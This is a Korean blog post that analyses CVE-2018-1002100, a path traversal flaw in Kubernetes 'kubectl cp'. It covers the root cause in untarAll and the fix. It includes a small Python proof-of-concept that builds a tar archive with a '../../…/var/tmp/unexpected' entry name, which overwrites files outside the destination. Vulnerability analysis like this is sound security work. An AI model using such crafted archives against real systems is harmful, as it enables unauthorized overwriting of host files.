---
layout: post
title: "CVE-2018-1002100"
date: 2021-12-28
categories: Kubernetes
tags: [kubernetes, cve]
---

# 개요

|취약한 버전|취약점 종류|취약점 설명|
|:---:|:---:|:-------:|
|kubernetes: ~v1.9.5|overwrite arbitrary local files|“kubectl cp” 명령어를 통해, 컨테이너에서 노드의 파일을 덮어쓸 수 있는 취약점|

# 배경지식

아래는 pkg/kubectl/cmd/cp.go 파일을 볼 때, 알아야 하는 함수들이다. path.clean 함수는 입력된 경로와 동등한 가장 짧은 경로를 반환하는 함수이다.

```
package main
import (
	"fmt"
	"path"
)

func main() {
	paths := []string{
		"a/c",
		"a//c",
		"a/c/.",
		"a/c/b/..",
		"/../a/c",
		"/../a/b/../././/c",
		"",
	}
	for _, p := range paths {
		fmt.Printf("Clean(%q) = %q\n", p, path.Clean(p))
	}
}
```

![](https://github.com/GroomPang/Research/blob/main/%EA%B7%B8%EB%A6%BC3.png?raw=true)

path.join 함수는 입력된 경로들을 탐색했을 때, 나오는 하나의 경로를 반환하는 함수이다.

```
package main
import (
	"fmt"
	"path"
)

func main() {
	fmt.Println(path.Join("a", "/b", "/c"))
	fmt.Println(path.Join("a", "/b/c"))
	fmt.Println(path.Join("a/b", "/c"))

	fmt.Println(path.Join("a/b", "../../../xyz"))

	fmt.Println(path.Join("", ""))
	fmt.Println(path.Join("a", ""))
	fmt.Println(path.Join("", "a"))
}
```

![](https://github.com/GroomPang/Research/blob/main/%EA%B7%B8%EB%A6%BC4.png?raw=true)

# Root Cause 분석

```
func untarAll(reader io.Reader, destFile, prefix string) error {
	entrySeq := -1

	// TODO: use compression here?
	tarReader := tar.NewReader(reader)
	for {
		header, err := tarReader.Next()
		if err != nil {
			if err != io.EOF {
				return err
			}
			break
		}
		entrySeq++
		mode := header.FileInfo().Mode()
		outFileName := path.Join(destFile, header.Name[len(prefix):])
		...
}
```

header.Name[len(prefix):]은 header.Name에서 prefix를 제외하고난 파일명이다.

위에서도 봤듯이 path.Join은 단순히 인자로 들어간 경로들을 차례로 접근했을 때, 하나의 단순화된 경로를 반환하는 함수이다. 즉, path traversal로 루트 디렉토리로 진입하는 것이 가능하다!

`kubectl cp mongodb:/something ./123`

prefix: something

destFile: ./123

header.Name: 아카이브에 있는 파일/디렉토리 명

outFileName: destFile과 header.Name에서 prefix를 제외하여 path.Join한 결과

→ 원래라면, prefix를 빼고, destFile을 상위 디렉토리로 하여 파일을 복사해오는 것이지만, path traversal이 일어나기 때문에, 상위 디렉토리로 쭉쭉 올라가는 모습이다.

baseName: outFileName의 상위 디렉토리 경로

# Exploit 재연

```
#!/usr/bin/python3

import tarfile
import tempfile
import os
import base64

with tarfile.TarFile.open("sample.tar", "w") as tar:
  with tempfile.NamedTemporaryFile() as text:
    text.write(b"Hello World\n")
    text.flush()

    tar.add(text.name,
      arcname="../../../../../../../var/tmp/unexpected")

  tar.close()
```

위 파일은 sample.tar를 만드는 코드로, 위를 수행하면, sample.tar 아카이브가 만들어지는데, 그 속엔 파일 하나가 들어있다.

![](https://github.com/GroomPang/Research/blob/main/%EA%B7%B8%EB%A6%BC5.png?raw=true)

파일명에 주목해 보면, 상위 디렉토리로 거슬러 올라가, 파일을 만들어낸다는 것을 알 수 있다.

```
func untarAll(reader io.Reader, destFile, prefix string) error {
	entrySeq := -1

	// TODO: use compression here?
	tarReader := tar.NewReader(reader)
	for {
		header, err := tarReader.Next()
		if err != nil {
			if err != io.EOF {
				return err
			}
			break
		}
		entrySeq++
		mode := header.FileInfo().Mode()
		outFileName := path.Join(destFile, header.Name[len(prefix):])
		baseName := path.Dir(outFileName)
		...
}
```

이전 장에서도 봤듯이, header.Name을 그대로 넣어주기 때문에 이를 destFile과 함께 그대로 path.Join해주게 되면, outFileName이 공격자가 원하는 경로로 만들어진다. "../"이 엄청 많은 이유는 어떤 디렉토리에서 cp를 수행해도 루트 디렉토리로 도착하도록 하기 위함이다.

![](https://github.com/GroomPang/Research/blob/main/%EA%B7%B8%EB%A6%BC6.png?raw=true)

# 패치 내용

```
// clean prevents path traversals by stripping them out.
// This is adapted from https://golang.org/src/net/http/fs.go#L74
func clean(fileName string) string {
	return path.Clean(string(os.PathSeparator) + fileName)
}

unc untarAll(reader io.Reader, destFile, prefix string) error {
	entrySeq := -1

	// TODO: use compression here?
	tarReader := tar.NewReader(reader)
	for {
		header, err := tarReader.Next()
		if err != nil {
			if err != io.EOF {
				return err
			}
			break
		}
		entrySeq++
		mode := header.FileInfo().Mode()
		outFileName := path.Join(destFile, clean(header.Name[len(prefix):]))
		baseName := path.Dir(outFileName)
		...
}
```

outFileName, 즉, 파일을 호스트에 덮어 쓸 때, path.Clean을 수행하였고, untarAll에서 해당 함수 한 번 호출하도록 업데이트한 이후, 1.9.6에서 1.13.4까지 이 패치가 지속되었다. 아래는 path.clean 함수의 수행 결과를 보여주는데, 이러한 조치가 path traversal을 막는 적절한 조치였다는 것을 확인할 수 있다.

```
package main

import (
        "fmt"
        "os"
        "path"
)

func clean(fileName string) string {
        return path.Clean(string(os.PathSeparator) + fileName)
}

func main() {
        fmt.Println(clean("../../../../../../../var/tmp/unexpected"))
```

![](https://github.com/GroomPang/Research/blob/main/%EA%B7%B8%EB%A6%BC7.png?raw=true)

# 참고자료

National Vulnerability Database, “CVE-2018-1002100 Detail”, https://nvd.nist.gov/vuln/detail/CVE-2018-1002100

Michael Hanselmann, “OpenShift Source-to-Image build privilege escalation to root”, https://hansmi.ch/articles/2018-04-openshift-s2i-security